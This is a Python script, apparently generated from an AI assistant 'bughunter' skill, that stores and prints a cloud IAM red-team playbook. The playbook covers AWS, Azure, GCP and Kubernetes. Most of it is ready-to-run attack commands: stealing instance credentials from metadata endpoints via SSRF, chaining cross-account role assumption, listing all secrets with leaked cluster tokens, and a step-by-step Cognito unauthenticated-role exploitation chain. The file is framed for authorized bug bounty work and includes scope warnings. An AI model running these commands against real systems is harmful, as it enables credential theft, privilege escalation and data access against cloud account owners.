#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: claude-bughunter/cloud-iam-deep

Skill: AWS access key patterns
Desc : Cloud IAM red-team attack chain across AWS, Azure, GCP — focused on EXTERNAL exploitation paths and post-credential-discovery privilege analysis. Covers IAM enumeration (aws iam, az role, gcloud iam), STS/AssumeRole chaining, Azure Managed Identity abuse (via SSRF/leak), GCP service account JSON abuse, IMDSv1/v2 attacks via SSRF, K8s ServiceAccount token privilege analysis once held (token discovery / cluster exposure is owned by hunt-k8s), role-trust-policy confused-deputy, cross-account assume-role enumeration, IAM privilege escalation patterns (24+ AWS, 8+ Azure, 6+ GCP), and AWS Cognito Identity Pool unauthenticated-role attack chain (GetId → GetCredentialsForIdentity → IAM role abuse). Built for the case where recon yields a credential (key, JSON, token) and you need to know what it grants and how to escalate. Use when an AWS key / Azure secret / GCP service account JSON / K8s SA token surfaces from a code repo, JS bundle, APK, breach corpus, or SSRF chain.

Run:  python claude-bughunter-cloud-iam-deep.py --help
      python claude-bughunter-cloud-iam-deep.py --list
      python claude-bughunter-cloud-iam-deep.py --dump <section>
"""
import sys, json, argparse

NAME = 'claude-bughunter/cloud-iam-deep'
TITLE = 'AWS access key patterns'
DESCRIPTION = 'Cloud IAM red-team attack chain across AWS, Azure, GCP — focused on EXTERNAL exploitation paths and post-credential-discovery privilege analysis. Covers IAM enumeration (aws iam, az role, gcloud iam), STS/AssumeRole chaining, Azure Managed Identity abuse (via SSRF/leak), GCP service account JSON abuse, IMDSv1/v2 attacks via SSRF, K8s ServiceAccount token privilege analysis once held (token discovery / cluster exposure is owned by hunt-k8s), role-trust-policy confused-deputy, cross-account assume-role enumeration, IAM privilege escalation patterns (24+ AWS, 8+ Azure, 6+ GCP), and AWS Cognito Identity Pool unauthenticated-role attack chain (GetId → GetCredentialsForIdentity → IAM role abuse). Built for the case where recon yields a credential (key, JSON, token) and you need to know what it grants and how to escalate. Use when an AWS key / Azure secret / GCP service account JSON / K8s SA token surfaces from a code repo, JS bundle, APK, breach corpus, or SSRF chain.'

PAYLOADS = {
    'main': ["name: cloud-iam-deep", "description: Cloud IAM red-team attack chain across AWS, Azure, GCP \u2014 focused on EXTERNAL exploitation paths and post-credential-discovery privilege analysis. Covers IAM enumeration (aws iam, az role, gcloud iam), STS/AssumeRole chaining, Azure Managed Identity abuse (via SSRF/leak), GCP service account JSON abuse, IMDSv1/v2 attacks via SSRF, K8s ServiceAccount token privilege analysis once held (token discovery / cluster exposure is owned by hunt-k8s), role-trust-policy confused-deputy, cross-account assume-role enumeration, IAM privilege escalation patterns (24+ AWS, 8+ Azure, 6+ GCP), and AWS Cognito Identity Pool unauthenticated-role attack chain (GetId \u2192 GetCredentialsForIdentity \u2192 IAM role abuse). Built for the case where recon yields a credential (key, JSON, token) and you need to know what it grants and how to escalate. Use when an AWS key / Azure secret / GCP service account JSON / K8s SA token surfaces from a code repo, JS bundle, APK, breach corpus, or SSRF chain.", "sources: aws-iam-docs, azure-rbac-docs, gcp-iam-docs, hackingthe.cloud, pacu, peirates, prowler, rhinosecuritylabs_research, hackerone_public", "report_count: 6"],
    'when-to-use': ["Trigger when:", "- A cloud credential surfaces (key, secret, token, JSON file)", "- SSRF chain reaches IMDS / metadata endpoint", "- APK / git-leak reveals embedded cloud key", "- Recon shows public S3/GCS/Azure-blob with permissions you can verify", "- A Kubernetes API or service-account token is exposed", "- Post-RCE on a cloud-hosted instance \u2014 pivot to cloud control plane", "Do NOT use for:", "- On-prem-only environments (use AD attack skills \u2014 but those are out of scope per external-only boundary)", "- Web2 vulns that happen to be on AWS \u2014 use the relevant `hunt-*` skill"],
    'credential-identification-first-60-seconds': ["```bash"],
    'aws-access-key-patterns': ["AKIA[0-9A-Z]{16}                # IAM user access key (long-term)", "ASIA[0-9A-Z]{16}                # STS temporary credential", "AGPA[0-9A-Z]{16}                # IAM group", "AIDA[0-9A-Z]{16}                # IAM user (user-id)", "AROA[0-9A-Z]{16}                # IAM role", "ANPA[0-9A-Z]{16}                # Managed policy"],
    'aws-secret-pattern-40-char-base64-ish-context-required': ["[A-Za-z0-9/+=]{40}              # AWS secret access key"],
    'azure': ["AccountKey=[A-Za-z0-9+/=]{86}   # Storage account key", "client_secret pattern + UUID    # Azure AD app credential"],
    'gcp-service-account-json': ["\"type\": \"service_account\",", "\"project_id\": \"...\",", "\"private_key_id\": \"...\",", "\"private_key\": \"-----BEGIN PRIVATE KEY-----...\""],
    'k8s-sa-token-jwt-format-decode-to-confirm': ["eyJhbGciOiJSUzI1...     # decode kid claim to see issuer"],
    'aws-read-only-validation-the-safe-first-step': ["```bash"],
    'set-credential': ["export AWS_ACCESS_KEY_ID=\"AKIA...\"", "export AWS_SECRET_ACCESS_KEY=\"...\""],
    '1-who-am-i': ["aws sts get-caller-identity"],
    'returns-userid-account-arn': [],
    'arn-tells-you-iam-user-vs-role-account-id-name': [],
    '2-what-can-i-do-the-privesc-question': [],
    'try-common-read-only-first-failures-still-inform-you': ["aws iam list-users 2>&1 | head -5", "aws iam list-roles 2>&1 | head -5", "aws iam list-policies 2>&1 | head -5", "aws iam list-groups 2>&1 | head -5"],
    '3-what-policies-are-attached-to-me': ["aws iam list-attached-user-policies --user-name <self>", "aws iam list-user-policies --user-name <self>          # inline policies", "aws iam list-groups-for-user --user-name <self>"],
    '4-service-by-service-surface': ["aws ec2 describe-instances --max-items 1 2>&1 | head", "aws s3 ls 2>&1 | head -10", "aws lambda list-functions --max-items 5 2>&1 | head", "aws rds describe-db-instances --max-items 5 2>&1 | head", "aws secretsmanager list-secrets --max-results 5 2>&1 | head", "aws ssm describe-parameters --max-results 5 2>&1 | head"],
    '5-audit-any-cross-account-external-trust': ["aws iam list-roles --query 'Roles[?contains(AssumeRolePolicyDocument.Statement[0].Principal.AWS, `arn:aws:iam::`)]' 2>&1 | head -20"],
    'aws-privesc-patterns-24-documented-iam-privesc-techniques': ["Quick lookup \u2014 if you have any of these IAM actions, escalate via the listed technique:", "Many of the destructive ones are out-of-scope for an external red-team; document the path, don't always execute."],
    'aws-sts-cross-account-role-chaining': ["```bash"],
    'enumerate-roles-you-can-assume-across-accounts': ["aws iam list-roles --query 'Roles[].[RoleName,AssumeRolePolicyDocument]' --output json > /tmp/roles.json"],
    'parse-for-principal-aws-containing-different-account-ids': [],
    'assume-a-role': ["aws sts assume-role --role-arn \"arn:aws:iam::OTHER_ACCT:role/CrossAccountRole\" --role-session-name \"rt-1\""],
    'set-new-creds': ["export AWS_ACCESS_KEY_ID=\"ASIA...\"", "export AWS_SECRET_ACCESS_KEY=\"...\"", "export AWS_SESSION_TOKEN=\"...\""],
    'verify': ["aws sts get-caller-identity  # should now show OTHER_ACCT"],
    're-enumerate-from-new-identity-chain-continues': ["**Confused-deputy pattern:** look for `sts:ExternalId` missing or trust policies that allow `arn:aws:iam::*:role/*`. If `ExternalId` is not required, anyone can assume the role."],
    'aws-imdsv1-imdsv2-abuse-via-ssrf': ["```bash"],
    'imdsv1-legacy-still-common-straight-get': ["curl http://169.254.169.254/latest/meta-data/iam/security-credentials/"],
    'returns-role-name-fetch-creds': ["curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>"],
    'json-with-accesskeyid-secretaccesskey-token-expiration': [],
    'imdsv2-requires-put-to-get-a-token-first-usually-mitigates-ssrf': ["curl -X PUT \"http://169.254.169.254/latest/api/token\" -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\"", "TOKEN=...", "curl -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/"],
    'ssrf-bypass-for-imdsv2': [],
    'most-server-side-fetchers-don-t-issue-put-requests-imdsv2-blocks-them': [],
    'exception-ssrf-in-functions-that-themselves-perform-requests-with-custom-headers': [],
    'azure-credential-validation': ["```bash"],
    'login-with-a-credential': ["az login --service-principal -u <appId> -p <password> --tenant <tenantId>"],
    'or-with-managed-identity-from-inside-azure-vm': ["az login --identity"],
    'who-am-i': ["az account show"],
    'subscriptions': ["az account list --output table"],
    'role-assignments-azure-rbac': ["az role assignment list --assignee <objectId> --all", "az role assignment list --all --query '[?principalId==`<objectId>`]' --output table"],
    'resources-i-can-read': ["az resource list --output table | head -30", "az storage account list --output table", "az keyvault list --output table", "az vm list --output table"],
    'azure-managed-identity-abuse': ["```bash"],
    'from-inside-azure-vm-post-rce-or-ssrf-to-imds-equivalent': [],
    'endpoint-http-169-254-169-254-metadata-identity-oauth2-token': ["curl -H \"Metadata: true\" \\", "\"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/\""],
    'returns-access-token-for-the-managed-identity-use': ["TOKEN=\"...\"", "curl -H \"Authorization: Bearer $TOKEN\" \"https://management.azure.com/subscriptions?api-version=2020-01-01\""],
    'get-token-for-key-vault': ["curl -H \"Metadata: true\" \\", "\"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net\""],
    'get-token-for-graph': ["curl -H \"Metadata: true\" \\", "\"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com\""],
    'if-managed-identity-has-graph-permissions-read-all-m365-data': [],
    'azure-privesc-patterns': [],
    'gcp-service-account-json': ["```bash"],
    'activate': ["gcloud auth activate-service-account --key-file=sa-leaked.json"],
    'who-am-i': ["gcloud auth list", "gcloud config get-value account", "gcloud config get-value project"],
    'what-roles-does-this-sa-have-project-level-only-not-org-level': ["gcloud projects get-iam-policy <projectId> \\", "--flatten=\"bindings[].members\" \\", "--format=\"table(bindings.role)\" \\", "--filter=\"bindings.members:<sa-email>\""],
    'service-by-service': ["gcloud compute instances list 2>&1 | head", "gcloud storage buckets list 2>&1 | head", "gcloud secrets list 2>&1 | head", "gcloud functions list 2>&1 | head", "gcloud sql instances list 2>&1 | head", "gcloud container clusters list 2>&1 | head"],
    'gcp-privesc-patterns': [],
    'gcp-imds-attack-via-ssrf-or-post-rce': ["```bash"],
    'gcp-imds-endpoint': ["curl -H \"Metadata-Flavor: Google\" \\", "\"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token\""],
    'returns-access-token-use': ["TOKEN=...", "curl -H \"Authorization: Bearer $TOKEN\" \\", "\"https://cloudresourcemanager.googleapis.com/v1/projects\""],
    'kubernetes-exposed-api-sa-token': ["```bash"],
    'check-anonymous-access-on-k8s-api': ["curl -sk \"https://k8s.target.com:6443/api/v1/namespaces\""],
    'anonymous-binding-system-anonymous-user-surprisingly-common': ["curl -sk \"https://k8s.target.com:6443/api/v1/pods?limit=1\""],
    'if-sa-token-exfil-d-eyj': ["export TOKEN=\"eyJ...\"", "kubectl --token=$TOKEN --server=https://k8s.target.com:6443 --insecure-skip-tls-verify get namespaces", "kubectl --token=$TOKEN --server=https://k8s.target.com:6443 --insecure-skip-tls-verify auth can-i --list", "kubectl --token=$TOKEN --server=https://k8s.target.com:6443 --insecure-skip-tls-verify get pods -A", "kubectl --token=$TOKEN --server=https://k8s.target.com:6443 --insecure-skip-tls-verify get secrets -A"],
    'k8s-privesc-patterns': [],
    'tooling-reference': [],
    'anti-patterns': ["- **DO NOT run write/delete operations without explicit OK** \u2014 IAM mutation is destructive and audit-visible", "- **DO NOT enumerate everything in scope of an account** \u2014 `aws iam list-users` against an account with 50,000 users is loud and slow", "- **DO NOT use `aws *` with non-test creds without confirming you have the right account** \u2014 accidentally hitting prod = career risk", "- **DO NOT confuse \"I have the credential\" with \"this credential is current\"** \u2014 always check expiration / rotation via STS first", "- **DO NOT assume an STS token from one account works across accounts** \u2014 region restrictions and trust policies apply", "- **DO NOT skip CloudTrail/Activity Log awareness** \u2014 every API call is logged; pair with `mid-engagement-ir-detection`", "- **DO NOT pivot deeper than the SOW allows** \u2014 discovering admin creds doesn't mean using them; some engagements are read-only"],
    'bridge-to-neighboring-skills': ["- `hunt-cloud-misconfig` \u2014 finds the credentials in the first place (public buckets, IMDS via SSRF, leaked JSON)", "- `hunt-ssrf` \u2014 SSRF\u2192IMDS is the canonical chain into cloud control plane", "- `apk-redteam-pipeline` \u2014 APK secret extraction commonly yields cloud creds", "- `supply-chain-attack-recon` \u2014 CI/CD pipelines store cloud creds; finding them is a separate workflow", "- `m365-entra-attack` \u2014 Azure cross-product; Managed Identity tokens cross over to Graph", "- `mid-engagement-ir-detection` \u2014 cloud control plane activity is monitored; expect mitigations"],
    'severity-scoring-guidance': [],
    'cleanup-discipline-deliverable-hygiene': ["If during the engagement you:", "- Used `sts:AssumeRole` to chain \u2014 note the role names and times in IoCs", "- Created any IAM resources (test users, roles, policies) \u2014 list them with explicit cleanup confirmation", "- Read sensitive data (Secrets Manager, KMS keys, Storage blob content) \u2014 note in deliverable that data was viewed but not exfiltrated outside the engagement systems", "Cloud activity is trivially auditable; the client WILL find it post-engagement. Documenting now > getting blindsided later."],
    'aws-cognito-identity-pool-unauthenticated-role-attack-chain-2024-2026-surface': ["AWS Cognito has two distinct services often confused: **User Pools** (auth provider) and **Identity Pools** (federated identity \u2192 IAM credentials). Identity Pools can be configured with *\"Enable access to unauthenticated identities\"* \u2014 which gives ANY anonymous caller an IAM role via `cognito-identity:GetId` \u2192 `cognito-identity:GetCredentialsForIdentity`. Mobile apps and SPAs ship the IdentityPoolId in the page bundle. Developers commonly attach overly-broad IAM permissions to the unauth role, especially when the pool was set up for AWS Amplify / Pinpoint / CloudWatch RUM and the role policy was never narrowed."],
    'step-1-discover-the-identitypoolid': ["The IdentityPoolId is a **public identifier** by AWS design (`<region>:<UUID>` format). The find:", "```bash"],
    'js-bundle-spa-regex-against-js-html-source-map-files': ["grep -ErohE \"identityPoolId[\\\"'`\\s:=]+[\\\"']([a-z]{2}-[a-z]+-[0-9]:[0-9a-f-]{36})[\\\"']\" .", "grep -ErohE \"IdentityPoolId[\\\"'`\\s:=]+[\\\"']([a-z]{2}-[a-z]+-[0-9]:[0-9a-f-]{36})[\\\"']\" .", "grep -ErohE \"\\\"PoolId\\\"\\s*:\\s*\\\"([a-z]{2}-[a-z]+-[0-9]:[0-9a-f-]{36})\\\"\" ."],
    'mobile-apk-after-jadx-decompile': ["grep -rEi \"identity[_-]?pool[_-]?id\" decoded/", "grep -rE \"\\\"[a-z]{2}-[a-z]+-[0-9]:[0-9a-f-]{36}\\\"\" decoded/"],
    'also-check': ["amplifyconfiguration.json", "awsconfiguration.json", "aws-exports.js", ".env.js", "*.js.map", "Wayback CDX captures, GitHub code-search for the apex domain + `IdentityPoolId`, and JS chunks linked from `index.html` are the high-yield search corpora."],
    'step-2-getid-unauth': ["```bash", "aws cognito-identity get-id \\", "--identity-pool-id us-east-1:abcd1234-5678-90ab-cdef-1234567890ab \\", "--region us-east-1 \\", "--no-sign-request", "`--no-sign-request` is critical \u2014 tells the CLI not to look for ambient AWS credentials. Returns `{\"IdentityId\": \"us-east-1:<uuid>\"}`. If this returns `NotAuthorizedException`, unauth identities are disabled \u2014 stop, not exploitable."],
    'step-3-getcredentialsforidentity': ["```bash", "aws cognito-identity get-credentials-for-identity \\", "--identity-id us-east-1:<returned-uuid> \\", "--region us-east-1 \\", "--no-sign-request", "Returns real STS credentials with ~1 hour TTL: `AccessKeyId` (ASIA\u2026), `SecretKey`, `SessionToken`, `Expiration`."],
    'step-4-confirm-role-arn': ["```bash", "export AWS_ACCESS_KEY_ID=ASIA...", "export AWS_SECRET_ACCESS_KEY=...", "export AWS_SESSION_TOKEN=...", "aws sts get-caller-identity", "Returns role ARN like `arn:aws:sts::<account>:assumed-role/Cognito_<PoolName>Unauth_Role/CognitoIdentityCredentials`. Account ID is now disclosed."],
    'step-5-enumerate-role-permissions': ["Direct (rare):", "```bash", "aws iam get-role --role-name Cognito_<PoolName>Unauth_Role", "aws iam list-role-policies --role-name Cognito_<PoolName>Unauth_Role", "aws iam list-attached-role-policies --role-name Cognito_<PoolName>Unauth_Role", "Blackbox (the normal case) \u2014 fire a permission probe across high-value services and observe `AccessDenied` vs success. Pacu's `iam__enum_permissions --role-name <name>` brute-forces ~500 IAM actions; `enumerate-iam.py` by Andr\u00e9s Riancho covers ~1000. Common over-permissions: `s3:Get*`/`s3:List*`, `dynamodb:Scan`, `lambda:InvokeFunction`, `appsync:GraphQL`, `cognito-idp:AdminCreateUser`, `iam:PassRole`, `kms:Decrypt`."],
    'severity-rubric': [],
    'disclosed-cases-authoritative-writeups': ["1. **Andres Riancho \u2014 \"Misconfigured Cognito Identity Pools\" (2020, refreshed 2023)** \u2014 original research establishing the attack class. `GetCredentialsForIdentity` against unauth pools with default `*` policies. [andresriancho.com](https://andresriancho.com/identity-pools-and-the-default-iam-role-trap/)", "2. **Rhino Security Labs \u2014 Pacu `cognito__enum_identity_pools` module** \u2014 production tooling that automates Steps 1-5 of the chain. [github.com/RhinoSecurityLabs/pacu](https://github.com/RhinoSecurityLabs/pacu/tree/master/pacu/modules/cognito__enum_identity_pools)", "3. **NotSoSecure / Claranet \u2014 \"Exploiting weak configurations in Amazon Cognito\" (Nov 2023)** \u2014 walkthrough of identityPoolId extraction \u2192 assume guest role \u2192 S3/DynamoDB/Lambda enumeration. Calls out RUM, Amplify, Pinpoint as the three SDKs that commonly expose the pool ID in HTML. [notsosecure.com](https://www.notsosecure.com/exploiting-weak-configurations-in-amazon-cognito/)", "4. **HackTricks Cloud \u2014 `aws-cognito-unauthenticated-enum`** \u2014 canonical playbook covering Steps 1-5. [cloud.hacktricks.wiki](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-unauthenticated-enum-access/aws-cognito-unauthenticated-enum.html)", "5. **Spaceraccoon / Eugene Lim \u2014 \"Mass Account Takeover via Cognito IdentityPool\" (Medium, 2020)** \u2014 SaaS provider exposed IdentityPoolId in Amplify config; unauth role had `cognito-idp:AdminConfirmSignUp` + `AdminUpdateUserAttributes` on the linked User Pool \u2014 silent confirmation of any signup + email change = mass ATO.", "6. **Datadog Security Labs \u2014 \"Following AWS Logs Backwards: Cognito Identity Pool Abuse\" (2024)** \u2014 telemetry across Datadog customer base showing real-world Cognito pool abuse. Non-trivial percentage of pools paired with policies broader than the minimum required. [securitylabs.datadoghq.com](https://securitylabs.datadoghq.com/articles/abusing-aws-cognito-misconfigurations/)"],
    'reporting-tip': ["Always include in the report:", "- `sts get-caller-identity` output (proves the role ARN + account ID)", "- Pacu `iam__enum_permissions` JSON output (proves the granted actions)", "- A concrete data-pull PoC (one sample S3 object listing, one DynamoDB record with PII redacted)", "Without all three, triagers downgrade to Medium. The 60-second test is `GetId \u2192 GetCredentialsForIdentity \u2192 sts get-caller-identity`. If you reach step 3 anonymously, you have a finding.", "Cross-reference: `hunt-cloud-misconfig` \u2192 `CloudWatch RUM weaponization` covers the specific RUM-embedded variant of this attack class."],
    'related-skills-chains': ["- **`hunt-ssrf`** \u2014 Most external paths to a cloud credential begin with SSRF reaching the metadata service. Chain primitive: SSRF + IMDSv1 \u2192 instance role token \u2192 `cloud-iam-deep` privilege-escalation patterns reach prod S3 / Secrets Manager.", "- **`hunt-cloud-misconfig`** \u2014 Public buckets and exposed configs are the most common credential-leak vector. Chain primitive: Cloud misconfig (`.env` in public S3) + leaked AWS access key \u2192 IAM enumeration \u2192 `iam:PassRole` chain to admin.", "- **`supply-chain-attack-recon`** \u2014 CI/CD often holds long-lived deploy credentials. Chain primitive: Exposed GitHub Actions OIDC misconfig + assume-role permission \u2192 `cloud-iam-deep` cross-account role assumption.", "- **`m365-entra-attack`** \u2014 Azure Managed Identity overlaps Entra service principals. Chain primitive: SSRF on Azure App Service \u2192 Managed Identity token \u2192 `m365-entra-attack` Graph API enumeration \u2192 cross-tenant escalation.", "- **`security-arsenal`** \u2014 Load the Cloud IAM Privilege-Escalation Payload Pack (24+ AWS, 8+ Azure, 6+ GCP escalation patterns with `aws cli` one-liners).", "- **`triage-validation`** \u2014 Apply the Server-State-vs-Policy gate: a permissive IAM policy alone is not a finding; demonstrate actual privileged action (e.g., read prod secret, create cross-account role) before reporting."],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()